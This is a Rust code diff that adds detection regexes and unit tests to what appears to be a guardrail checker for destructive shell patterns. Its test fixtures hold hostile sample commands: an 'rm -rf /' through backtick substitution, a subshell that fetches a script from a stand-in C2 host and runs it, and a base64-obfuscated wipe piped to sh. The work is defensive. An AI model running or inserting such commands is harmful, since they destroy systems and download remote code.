@@ -23,6 +23,9 @@ static DESTRUCTIVE_PATTERNS: LazyLock<Vec<(Regex, &'static str)>> = LazyLock::ne
         (Regex::new(r"del\s+/f\s+/s\s+/q\s+C:\\").unwrap(), "System wipe command (del C:\\)"),
         (Regex::new(r"format\s+[A-Z]:").unwrap(), "Disk format invocation"),
         (Regex::new(r":\(\)\{\s*:\|:&\s*\};:").unwrap(), "Fork bomb detected"),
+        (Regex::new(r"(?i)base64\s+(?:-d|--decode)\s*\|\s*(?:ba|z)?sh").unwrap(), "Obfuscated shell execution (base64 decode pipe)"),
+        (Regex::new(r"`[^`]*\b(rm|curl|wget|bash|sh|powershell)\b[^`]*`").unwrap(), "Nested backtick command injection"),
+        (Regex::new(r"\$\([^)]*\b(rm|curl|wget|bash|sh|powershell)\b[^)]*\)").unwrap(), "Nested subshell command injection"),
     ]
 });
 
@@ -322,5 +325,48 @@ mod tests {
         assert!(tracker.check_budget_now(100).is_ok());
         tracker.record_usage_now(100);
         assert_eq!(tracker.current_requests(Instant::now()), 1);
+    }
+
+    #[test]
+    fn test_flag_backtick_command_injection() {
+        let code = r#"
+            #include <stdlib.h>
+            int main() {
+                // Evasion attempt using backtick command substitution
+                system("`rm -rf /`");
+                return 0;
+            }
+        "#;
+        let report = GuardrailChecker::inspect(code, "cpp");
+        assert!(!report.is_safe);
+        assert!(report.warnings.iter().any(|w| w.contains("CRITICAL:")));
+    }
+
+    #[test]
+    fn test_flag_subshell_command_injection() {
+        let code = r#"
+            fn main() {
+                // Evasion attempt using subshell command substitution
+                let payload = "$(curl -s https://evil-c2.net/drop.sh)";
+                std::process::Command::new("sh").arg("-c").arg(payload).status().unwrap();
+            }
+        "#;
+        let report = GuardrailChecker::inspect(code, "rs");
+        assert!(!report.is_safe);
+        assert!(report.warnings.iter().any(|w| w.contains("CRITICAL:")));
+    }
+
+    #[test]
+    fn test_flag_base64_pipe_injection() {
+        let code = r#"
+            fn main() {
+                // Evasion attempt piping base64-encoded payload to shell
+                let cmd = "echo cm0gLXJmIC8= | base64 -d | sh";
+                let _ = std::process::Command::new("sh").arg("-c").arg(cmd).status();
+            }
+        "#;
+        let report = GuardrailChecker::inspect(code, "rs");
+        assert!(!report.is_safe);
+        assert!(report.warnings.iter().any(|w| w.contains("CRITICAL: Malicious destructive pattern found: Obfuscated shell execution (base64 decode pipe)")));
     }
 }
